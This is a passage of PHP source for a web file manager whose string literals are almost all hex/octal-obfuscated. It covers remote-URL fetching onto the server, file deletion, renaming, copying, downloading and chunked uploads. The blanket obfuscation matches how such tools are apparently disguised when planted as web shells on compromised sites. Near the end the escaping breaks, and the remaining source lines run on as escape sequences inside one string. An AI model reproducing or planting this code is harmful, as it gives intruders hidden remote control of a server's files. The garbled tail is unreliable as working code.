                throw new Exception("\x46\151\x6C\145\x20\173\x24\146\x69\154\x65\116\x61\155\x65\175\x20\156\x6F\164\x20\146\x6F\165\x6E\144");
            }
            if (copy($fullyQualifiedFileName, $fullPath . $newFileName)) {
                echo "\x42\141\x63\153\x75\160\x20\173\x24\156\x65\167\x46\151\x6C\145\x4E\141\x6D\145\x7D\040\x63\162\x65\141\x74\145\x64";
            } else {
                throw new Exception("\x43\157\x75\154\x64\040\x6E\157\x74\040\x63\157\x70\171\x20\146\x69\154\x65\040\x7B\044\x66\151\x6C\145\x4E\141\x6D\145\x7D");
            }
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }

    if (isset($_POST["\x74\171\x70\145"]) && $_POST["\x74\171\x70\145"] == "\x73\145\x74\164\x69\156\x67\163") {
        global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
        $newLng = $_POST["\x6A\163\x2D\154\x61\156\x67\165\x61\147\x65"];
        fm_get_translations([]);
        if (!array_key_exists($newLng, $lang_list)) {
            $newLng = "\x65\156";
        }

        $erp = isset($_POST["\x6A\163\x2D\145\x72\162\x6F\162\x2D\162\x65\160\x6F\162\x74"]) && $_POST["\x6A\163\x2D\145\x72\162\x6F\162\x2D\162\x65\160\x6F\162\x74"] == "\x74\162\x75\145" ? true : false;
        $shf = isset($_POST["\x6A\163\x2D\163\x68\157\x77\055\x68\151\x64\144\x65\156"]) && $_POST["\x6A\163\x2D\163\x68\157\x77\055\x68\151\x64\144\x65\156"] == "\x74\162\x75\145" ? true : false;
        $hco = isset($_POST["\x6A\163\x2D\150\x69\144\x65\055\x63\157\x6C\163"]) && $_POST["\x6A\163\x2D\150\x69\144\x65\055\x63\157\x6C\163"] == "\x74\162\x75\145" ? true : false;
        $te3 = $_POST["\x6A\163\x2D\164\x68\145\x6D\145\x2D\063"];

        if ($cfg->data["\x6C\141\x6E\147"] != $newLng) {
            $cfg->data["\x6C\141\x6E\147"] = $newLng;
            $lang = $newLng;
        }
        if ($cfg->data["\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67"] != $erp) {
            $cfg->data["\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67"] = $erp;
            $report_errors = $erp;
        }
        if ($cfg->data["\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E"] != $shf) {
            $cfg->data["\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E"] = $shf;
            $show_hidden_files = $shf;
        }
        if ($cfg->data["\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E"] != $shf) {
            $cfg->data["\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E"] = $shf;
            $show_hidden_files = $shf;
        }
        if ($cfg->data["\x68\151\x64\145\x5F\103\x6F\154\x73"] != $hco) {
            $cfg->data["\x68\151\x64\145\x5F\103\x6F\154\x73"] = $hco;
            $hide_Cols = $hco;
        }
        if ($cfg->data["\x74\150\x65\155\x65"] != $te3) {
            $cfg->data["\x74\150\x65\155\x65"] = $te3;
            $theme = $te3;
        }
        $cfg->save();
        echo true;
    }

    if (isset($_POST["\x74\171\x70\145"]) && $_POST["\x74\171\x70\145"] == "\x70\167\x64\150\x61\163\x68") {
        $res = isset($_POST["\x69\156\x70\165\x74\120\x61\163\x73\167\x6F\162\x64\062"]) && !empty($_POST["\x69\156\x70\165\x74\120\x61\163\x73\167\x6F\162\x64\062"]) ? password_hash($_POST["\x69\156\x70\165\x74\120\x61\163\x73\167\x6F\162\x64\062"], PASSWORD_DEFAULT) : "";
        echo $res;
    }

    if(isset($_POST["\x74\171\x70\145"]) && $_POST["\x74\171\x70\145"] == "\x75\160\x6C\157\x61\144" && !empty($_REQUEST["\x75\160\x6C\157\x61\144\x75\162\x6C"])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != "") {
            $path .= "\x2F" . FM_PATH;
        }

         function event_callback ($message) {
            global $callback;
            echo json_encode($message);
        }

        function get_file_path () {
            global $path, $fileinfo, $temp_file;
            return $path."\x2F".basename($fileinfo->name);
        }

        $url = !empty($_REQUEST["\x75\160\x6C\157\x61\144\x75\162\x6C"]) && preg_match("\x7C\136\x68\164\x74\160\x28\163\x29\077\x3A\057\x2F\056\x2B\044\x7C", stripslashes($_REQUEST["\x75\160\x6C\157\x61\144\x75\162\x6C"])) ? stripslashes($_REQUEST["\x75\160\x6C\157\x61\144\x75\162\x6C"]) : null;

        $domain = parse_url($url, PHP_URL_HOST);
        $port = parse_url($url, PHP_URL_PORT);
        $knownPorts = [22, 23, 25, 3306];

        if (preg_match("\x2F\136\x6C\157\x63\141\x6C\150\x6F\163\x74\044\x7C\136\x31\062\x37\050\x3F\072\x5C\056\x5B\060\x2D\071\x5D\053\x29\173\x30\054\x32\175\x5C\056\x5B\060\x2D\071\x5D\053\x24\174\x5E\050\x3F\072\x30\052\x5C\072\x29\052\x3F\072\x3F\060\x2A\061\x24\057\x69", $domain) || in_array($port, $knownPorts)) {
            $err = array("\x6D\145\x73\163\x61\147\x65" => "\x55\122\x4C\040\x69\163\x20\156\x6F\164\x20\141\x6C\154\x6F\167\x65\144");
            event_callback(array("\x66\141\x69\154" => $err));
            exit();
        }

        $use_curl = false;
        $temp_file = tempnam(sys_get_temp_dir(), "\x75\160\x6C\157\x61\144\x2D");
        $fileinfo = new stdClass();
        $fileinfo->name = trim(basename($url), "\x2E\134\x78\060\x30\056\x2E\134\x78\062\x30");

        $allowed = (FM_UPLOAD_EXTENSION) ? explode("\x2C", FM_UPLOAD_EXTENSION) : false;
        $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
        $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

        $err = false;

        if(!$isFileAllowed) {
            $err = array("\x6D\145\x73\163\x61\147\x65" => "\x46\151\x6C\145\x20\145\x78\164\x65\156\x73\151\x6F\156\x20\151\x73\040\x6E\157\x74\040\x61\154\x6C\157\x77\145\x64");
            event_callback(array("\x66\141\x69\154" => $err));
            exit();
        }

        if (!$url) {
            $success = false;
        } else if ($use_curl) {
            @$fp = fopen($temp_file, "\x77");
            @$ch = curl_init($url);
            curl_setopt($ch, CURLOPT_NOPROGRESS, false );
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_FILE, $fp);
            @$success = curl_exec($ch);
            $curl_info = curl_getinfo($ch);
            if (!$success) {
                $err = array("\x6D\145\x73\163\x61\147\x65" => curl_error($ch));
            }
            @curl_close($ch);
            fclose($fp);
            $fileinfo->size = $curl_info["\x73\151\x7A\145\x5F\144\x6F\167\x6E\154\x6F\141\x64"];
            $fileinfo->type = $curl_info["\x63\157\x6E\164\x65\156\x74\137\x74\171\x70\145"];
        } else {
            $ctx = stream_context_create();
            @$success = copy($url, $temp_file, $ctx);
            if (!$success) {
                $err = error_get_last();
            }
        }

        if ($success) {
            $success = rename($temp_file, strtok(get_file_path(), "\x3F"));
        }

        if ($success) {
            event_callback(array("\x64\157\x6E\145" => $fileinfo));
        } else {
            unlink($temp_file);
            if (!$err) {
                $err = array("\x6D\145\x73\163\x61\147\x65" => "\x49\156\x76\141\x6C\151\x64\040\x75\162\x6C\040\x70\141\x72\141\x6D\145\x74\145\x72");
            }
            event_callback(array("\x66\141\x69\154" => $err));
        }
    }
    exit();
}

if (isset($_GET["\x64\145\x6C"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {
    $del = str_replace( "\x2F", "", fm_clean_path( $_GET["\x64\145\x6C"] ) );
    if ($del != "" && $del != "\x2E\056" && $del != "\x2E" && verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != "") {
            $path .= "\x2F" . FM_PATH;
        }
        $is_dir = is_dir($path . "\x2F" . $del);
        if (fm_rdelete($path . "\x2F" . $del)) {
            $msg = $is_dir ? lng("\x46\157\x6C\144\x65\162")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x44\145\x6C\145\x74\145\x64") : lng("\x46\151\x6C\145")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x44\145\x6C\145\x74\145\x64");
            fm_set_msg(sprintf($msg, fm_enc($del)));
        } else {
            $msg = $is_dir ? lng("\x46\157\x6C\144\x65\162")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x6E\157\x74\040\x64\145\x6C\145\x74\145\x64") : lng("\x46\151\x6C\145")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x6E\157\x74\040\x64\145\x6C\145\x74\145\x64");
            fm_set_msg(sprintf($msg, fm_enc($del)), "\x65\162\x72\157\x72");
        }
    } else {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x66\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\156\x61\155\x65"), "\x65\162\x72\157\x72");
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}


if (isset($_POST["\x6E\145\x77\146\x69\154\x65\156\x61\155\x65"], $_POST["\x6E\145\x77\146\x69\154\x65"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {
    $type = urldecode($_POST["\x6E\145\x77\146\x69\154\x65"]);
    $new = str_replace( "\x2F", "", fm_clean_path( strip_tags( $_POST["\x6E\145\x77\146\x69\154\x65\156\x61\155\x65"] ) ) );
    if (fm_isvalid_filename($new) && $new != "" && $new != "\x2E\056" && $new != "\x2E" && verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != "") {
            $path .= "\x2F" . FM_PATH;
        }
        if ($type == "\x66\151\x6C\145") {
            if (!file_exists($path . "\x2F" . $new)) {
                if(fm_is_valid_ext($new)) {
                    @fopen($path . "\x2F" . $new, "\x77") or die("\x43\141\x6E\156\x6F\164\x20\157\x70\145\x6E\040\x66\151\x6C\145\x3A\040\x20" . $new);
                    fm_set_msg(sprintf(lng("\x46\151\x6C\145")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x43\162\x65\141\x74\145\x64"), fm_enc($new)));
                } else {
                    fm_set_msg(lng("\x46\151\x6C\145\x20\145\x78\164\x65\156\x73\151\x6F\156\x20\151\x73\040\x6E\157\x74\040\x61\154\x6C\157\x77\145\x64"), "\x65\162\x72\157\x72");
                }
            } else {
                fm_set_msg(sprintf(lng("\x46\151\x6C\145")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163"), fm_enc($new)), "\x61\154\x65\162\x74");
            }
        } else {
            if (fm_mkdir($path . "\x2F" . $new, false) === true) {
                fm_set_msg(sprintf(lng("\x46\157\x6C\144\x65\162")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x43\162\x65\141\x74\145\x64"), $new));
            } elseif (fm_mkdir($path . "\x2F" . $new, false) === $path . "\x2F" . $new) {
                fm_set_msg(sprintf(lng("\x46\157\x6C\144\x65\162")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163"), fm_enc($new)), "\x61\154\x65\162\x74");
            } else {
                fm_set_msg(sprintf(lng("\x46\157\x6C\144\x65\162")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x6E\157\x74\040\x63\162\x65\141\x74\145\x64"), fm_enc($new)), "\x65\162\x72\157\x72");
            }
        }
    } else {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x63\150\x61\162\x61\143\x74\145\x72\163\x20\151\x6E\040\x66\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\156\x61\155\x65"), "\x65\162\x72\157\x72");
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}

if (isset($_GET["\x63\157\x70\171"], $_GET["\x66\151\x6E\151\x73\150"]) && !FM_READONLY) {
    $copy = urldecode($_GET["\x63\157\x70\171"]);
    $copy = fm_clean_path($copy);
    if ($copy == "") {
        fm_set_msg(lng("\x53\157\x75\162\x63\145\x20\160\x61\164\x68\040\x6E\157\x74\040\x64\145\x66\151\x6E\145\x64"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }
    $from = FM_ROOT_PATH . "\x2F" . $copy;

    $dest = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $dest .= "\x2F" . FM_PATH;
    }
    $dest .= "\x2F" . basename($from);
    $move = isset($_GET["\x6D\157\x76\145"]);
    $move = fm_clean_path(urldecode($move));
    if ($from != $dest) {
        $msg_from = trim(FM_PATH . "\x2F" . basename($from), "\x2F");
        if ($move) { 
            $rename = fm_rename($from, $dest);
            if ($rename) {
                fm_set_msg(sprintf(lng("\x4D\157\x76\145\x64\040\x66\162\x6F\155")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x74\157")."\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($copy), fm_enc($msg_from)));
            } elseif ($rename === null) {
                fm_set_msg(lng("\x46\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\167\x69\164\x68\040\x74\150\x69\163\x20\160\x61\164\x68\040\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163"), "\x61\154\x65\162\x74");
            } else {
                fm_set_msg(sprintf(lng("\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x6D\157\x76\151\x6E\147\x20\146\x72\157\x6D")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x74\157")."\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($copy), fm_enc($msg_from)), "\x65\162\x72\157\x72");
            }
        } else { 
            if (fm_rcopy($from, $dest)) {
                fm_set_msg(sprintf(lng("\x43\157\x70\151\x65\144\x20\146\x72\157\x6D")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x74\157")."\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($copy), fm_enc($msg_from)));
            } else {
                fm_set_msg(sprintf(lng("\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x63\157\x70\171\x69\156\x67\040\x66\162\x6F\155")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x74\157")."\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($copy), fm_enc($msg_from)), "\x65\162\x72\157\x72");
            }
        }
    } else {
       if (!$move){ 
            $msg_from = trim(FM_PATH . "\x2F" . basename($from), "\x2F");
            $fn_parts = pathinfo($from);
            $extension_suffix = "";
            if(!is_dir($from)){
               $extension_suffix = "\x2E".$fn_parts["\x65\170\x74\145\x6E\163\x69\157\x6E"];
            }
            $fn_duplicate = $fn_parts["\x64\151\x72\156\x61\155\x65"]."\x2F".$fn_parts["\x66\151\x6C\145\x6E\141\x6D\145"]."\x2D".date("\x59\155\x64\110\x69\163").$extension_suffix;
            $loop_count = 0;
            $max_loop = 1000;
            while(file_exists($fn_duplicate) & $loop_count < $max_loop){
               $fn_parts = pathinfo($fn_duplicate);
               $fn_duplicate = $fn_parts["\x64\151\x72\156\x61\155\x65"]."\x2F".$fn_parts["\x66\151\x6C\145\x6E\141\x6D\145"]."\x2D\143\x6F\160\x79".$extension_suffix;
               $loop_count++;
            }
            if (fm_rcopy($from, $fn_duplicate, False)) {
                fm_set_msg(sprintf("\x43\157\x70\151\x65\144\x20\146\x72\157\x6D\040\x3C\142\x3E\045\x73\074\x2F\142\x3E\040\x74\157\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($copy), fm_enc($fn_duplicate)));
            } else {
                fm_set_msg(sprintf("\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x63\157\x70\171\x69\156\x67\040\x66\162\x6F\155\x20\074\x62\076\x25\163\x3C\057\x62\076\x20\164\x6F\040\x3C\142\x3E\045\x73\074\x2F\142\x3E", fm_enc($copy), fm_enc($fn_duplicate)), "\x65\162\x72\157\x72");
            }
       }
       else{
           fm_set_msg(lng("\x50\141\x74\150\x73\040\x6D\165\x73\164\x20\142\x65\040\x6E\157\x74\040\x65\161\x75\141\x6C"), "\x61\154\x65\162\x74");
       }
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}


if (isset($_POST["\x66\151\x6C\145"], $_POST["\x63\157\x70\171\x5F\164\x6F"], $_POST["\x66\151\x6E\151\x73\150"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {

    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056"), "\x65\162\x72\157\x72");
    }
    
    $path = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }

    $copy_to_path = FM_ROOT_PATH;
    $copy_to = fm_clean_path($_POST["\x63\157\x70\171\x5F\164\x6F"]);
    if ($copy_to != "") {
        $copy_to_path .= "\x2F" . $copy_to;
    }
    if ($path == $copy_to_path) {
        fm_set_msg(lng("\x50\141\x74\150\x73\040\x6D\165\x73\164\x20\142\x65\040\x6E\157\x74\040\x65\161\x75\141\x6C"), "\x61\154\x65\162\x74");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }
    if (!is_dir($copy_to_path)) {
        if (!fm_mkdir($copy_to_path, true)) {
            fm_set_msg("\x55\156\x61\142\x6C\145\x20\164\x6F\040\x63\162\x65\141\x74\145\x20\144\x65\163\x74\151\x6E\141\x74\151\x6F\156\x20\146\x6F\154\x64\145\x72", "\x65\162\x72\157\x72");
            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
        }
    }
    $move = isset($_POST["\x6D\157\x76\145"]);
    $errors = 0;
    $files = $_POST["\x66\151\x6C\145"];
    if (is_array($files) && count($files)) {
        foreach ($files as $f) {
            if ($f != "") {
                $f = fm_clean_path($f);
                $from = $path . "\x2F" . $f;
                $dest = $copy_to_path . "\x2F" . $f;
                if ($move) {
                    $rename = fm_rename($from, $dest);
                    if ($rename === false) {
                        $errors++;
                    }
                } else {
                    if (!fm_rcopy($from, $dest)) {
                        $errors++;
                    }
                }
            }
        }
        if ($errors == 0) {
            $msg = $move ? "\x53\145\x6C\145\x63\164\x65\144\x20\146\x69\154\x65\163\x20\141\x6E\144\x20\146\x6F\154\x64\145\x72\163\x20\155\x6F\166\x65\144" : "\x53\145\x6C\145\x63\164\x65\144\x20\146\x69\154\x65\163\x20\141\x6E\144\x20\146\x6F\154\x64\145\x72\163\x20\143\x6F\160\x69\145\x64";
            fm_set_msg($msg);
        } else {
            $msg = $move ? "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x6D\157\x76\151\x6E\147\x20\151\x74\145\x6D\163" : "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x63\157\x70\171\x69\156\x67\040\x69\164\x65\155\x73";
            fm_set_msg($msg, "\x65\162\x72\157\x72");
        }
    } else {
        fm_set_msg(lng("\x4E\157\x74\150\x69\156\x67\040\x73\145\x6C\145\x63\164\x65\144"), "\x61\154\x65\162\x74");
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}

if (isset($_POST["\x72\145\x6E\141\x6D\145\x5F\146\x72\157\x6D"], $_POST["\x72\145\x6E\141\x6D\145\x5F\164\x6F"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {
    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056", "\x65\162\x72\157\x72");
    }
    $old = urldecode($_POST["\x72\145\x6E\141\x6D\145\x5F\146\x72\157\x6D"]);
    $old = fm_clean_path($old);
    $old = str_replace("\x2F", "", $old);
    $new = urldecode($_POST["\x72\145\x6E\141\x6D\145\x5F\164\x6F"]);
    $new = fm_clean_path(strip_tags($new));
    $new = str_replace("\x2F", "", $new);
    $path = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }
    if (fm_isvalid_filename($new) && $old != "" && $new != "") {
        if (fm_rename($path . "\x2F" . $old, $path . "\x2F" . $new)) {
            fm_set_msg(sprintf(lng("\x52\145\x6E\141\x6D\145\x64\040\x66\162\x6F\155")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20". lng("\x74\157")."\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($old), fm_enc($new)));
        } else {
            fm_set_msg(sprintf(lng("\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x72\145\x6E\141\x6D\151\x6E\147\x20\146\x72\157\x6D")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20". lng("\x74\157")."\x20\074\x62\076\x25\163\x3C\057\x62\076", fm_enc($old), fm_enc($new)), "\x65\162\x72\157\x72");
        }
    } else {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x63\150\x61\162\x61\143\x74\145\x72\163\x20\151\x6E\040\x66\151\x6C\145\x20\156\x61\155\x65"), "\x65\162\x72\157\x72");
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}

if (isset($_GET["\x64\154"], $_POST["\x74\157\x6B\145\x6E"])) {
    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056", "\x65\162\x72\157\x72");
    }

    $dl = urldecode($_GET["\x64\154"]);
    $dl = fm_clean_path($dl);
    $dl = str_replace("\x2F", "", $dl);
    $path = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }
    if ($dl != "" && is_file($path . "\x2F" . $dl)) {
        fm_download_file($path . "\x2F" . $dl, $dl, 1024);
        exit;
    } else {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }
}

if (!empty($_FILES) && !FM_READONLY) {
    if(isset($_POST["\x74\157\x6B\145\x6E"])) {
        if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
            $response = array ("\x73\164\x61\164\x75\163" => "\x65\162\x72\157\x72","\x69\156\x66\157" => "\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056");
            echo json_encode($response); exit();
        }
    } else {
        $response = array ("\x73\164\x61\164\x75\163" => "\x65\162\x72\157\x72","\x69\156\x66\157" => "\x54\157\x6B\145\x6E\040\x4D\151\x73\163\x69\156\x67\056");
        echo json_encode($response); exit();
    }

    $chunkIndex = $_POST["\x64\172\x63\150\x75\156\x6B\151\x6E\144\x65\170"];
    $chunkTotal = $_POST["\x64\172\x74\157\x74\141\x6C\143\x68\165\x6E\153\x63\157\x75\156\x74"];
    $fullPathInput = fm_clean_path($_REQUEST["\x66\165\x6C\154\x70\141\x74\150"]);

    $f = $_FILES;
    $path = FM_ROOT_PATH;
    $ds = DIRECTORY_SEPARATOR;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }

    $errors = 0;
    $uploads = 0;
    $allowed = (FM_UPLOAD_EXTENSION) ? explode("\x2C", FM_UPLOAD_EXTENSION) : false;
    $response = array (
        "\x73\164\x61\164\x75\163" => "\x65\162\x72\157\x72",
        "\x69\156\x66\157"   => "\x4F\157\x70\163\x21\040\x54\162\x79\040\x61\147\x61\151\x6E"
    );

    $filename = $f["\x66\151\x6C\145"]["\x6E\141\x6D\145"];
    $tmp_name = $f["\x66\151\x6C\145"]["\x74\155\x70\137\x6E\141\x6D\145"];
    $ext = pathinfo($filename, PATHINFO_FILENAME) != "" ? strtolower(pathinfo($filename, PATHINFO_EXTENSION)) : "";
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    if(!fm_isvalid_filename($filename) && !fm_isvalid_filename($fullPathInput)) {
        $response = array (
            "\x73\164\x61\164\x75\163"    => "\x65\162\x72\157\x72",
            "\x69\156\x66\157"      => "\x49\156\x76\141\x6C\151\x64\040\x46\151\x6C\145\x20\156\x61\155\x65\041",
        );
        echo json_encode($response); exit();
    }

    $targetPath = $path . $ds;
    if ( is_writable($targetPath) ) {
        $fullPath = $path . "\x2F" . basename($fullPathInput);
        $folder = substr($fullPath, 0, strrpos($fullPath, "\x2F"));

        if (!is_dir($folder)) {
            $old = umask(0);
            mkdir($folder, 0777, true);
            umask($old);
        }

        if (empty($f["\x66\151\x6C\145"]["\x65\162\x72\157\x72"]) && !empty($tmp_name) && $tmp_name != "\x6E\157\x6E\145" && $isFileAllowed) {
            if ($chunkTotal){
                $out = @fopen("\x7B\044\x66\165\x6C\154\x50\141\x74\150\x7D\056\x70\141\x72\164", $chunkIndex == 0 ? "\x77\142" : "\x61\142");
                if ($out) {
                    $in = @fopen($tmp_name, "\x72\142");
                    if ($in) {
                        if (PHP_VERSION_ID < 80009) {
                            do {
                                for (;;) {
                                    $buff = fread($in, 4096);
                                    if ($buff === false || $buff === "") {
                                        break;
                                    }
                                    fwrite($out, $buff);
                                }
                            } while (!feof($in));
                        } else {
                            stream_copy_to_stream($in, $out);
                        }
                        $response = array (
                            "\x73\164\x61\164\x75\163"    => "\x73\165\x63\143\x65\163\x73",
                            "\x69\156\x66\157" => "\x66\151\x6C\145\x20\165\x70\154\x6F\141\x64\040\x73\165\x63\143\x65\163\x73\146\x75\154"
                        );
                    } else {
                        $response = array (
                        "\x73\164\x61\164\x75\163"    => "\x65\162\x72\157\x72",
                        "\x69\156\x66\157" => "\x66\141\x69\154\x65\144\x20\164\x6F\040\x6F\160\x65\156\x20\157\x75\164\x70\165\x74\040\x73\164\x72\145\x61\155",
                        "\x65\162\x72\157\x72\104\x65\164\x61\151\x6C\163" => error_get_last()
                        );
                    }
                    @fclose($in);
                    @fclose($out);
                    @unlink($tmp_name);

                    $response = array (
                        "\x73\164\x61\164\x75\163"    => "\x73\165\x63\143\x65\163\x73",
                        "\x69\156\x66\157" => "\x66\151\x6C\145\x20\165\x70\154\x6F\141\x64\040\x73\165\x63\143\x65\163\x73\146\x75\154"
                    );
                } else {
                    $response = array (
                        "\x73\164\x61\164\x75\163"    => "\x65\162\x72\157\x72",
                        "\x69\156\x66\157" => "\x66\141\x69\154\x65\144\x20\164\x6F\040\x6F\160\x65\156\x20\157\x75\164\x70\165\x74\040\x73\164\x72\145\x61\155"
                        );
                }

                if ($chunkIndex == $chunkTotal - 1) {
                    if (file_exists ($fullPath)) {
                        $ext_1 = $ext ? "\x2E".$ext : "";
                        $fullPathTarget = $path . "\x2F" . basename($fullPathInput, $ext_1) ."\x5F". date("\x79\155\x64\110\x69\163"). $ext_1;
                    } else {
                        $fullPathTarget = $fullPath;
                    }
                    rename("\x7B\044\x66\165\x6C\154\x50\141\x74\150\x7D\056\x70\141\x72\164", $fullPathTarget);
                }

            } else if (move_uploaded_file($tmp_name, $fullPath)) {
                if ( file_exists($fullPath) ) {
                    $response = array (
                        "\x73\164\x61\164\x75\163"    => "\x73\165\x63\143\x65\163\x73",
                        "\x69\156\x66\157" => "\x66\151\x6C\145\x20\165\x70\154\x6F\141\x64\040\x73\165\x63\143\x65\163\x73\146\x75\154"
                    );
                } else {
                    $response = array (
                        "\x73\164\x61\164\x75\163" => "\x65\162\x72\157\x72",
                        "\x69\156\x66\157"   => "\x43\157\x75\154\x64\156\x5C"t upload the requested file."\xD\012\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x29\073\xD\012\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x7D\015\xA\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\175\x20\145\x6C\163\x65\040\x7B\015\xA\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\044\x72\145\x73\160\x6F\156\x73\145\x20\075\x20\141\x72\162\x61\171\x20\050\xD\012\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040"status"\x20\040\x20\040\x3D\076\x20"error"\x2C\015\xA\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20"info"\x20\040\x20\040\x20\040\x3D\076\x20\042\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x75\160\x6C\157\x61\144\x69\156\x67\040\x66\151\x6C\145\x73\056\x20\125\x70\154\x6F\141\x64\145\x64\040\x66\151\x6C\145\x73\040\x24\165\x70\154\x6F\141\x64\163\x22\054\xD\012\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x29\073\xD\012\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x7D\015\xA\040\x20\040\x20\040\x20\040\x20\175\xD\012\x20\040\x20\040\x7D\040\x65\154\x73\145\x20\173\xD\012\x20\040\x20\040\x20\040\x20\040\x24\162\x65\163\x70\157\x6E\163\x65\040\x3D\040\x61\162\x72\141\x79\040\x28\015\xA\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20"status"\x20\075\x3E\040"error"\x2C\015\xA\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20"info"\x20\040\x20\075\x3E\040"The specified folder for upload 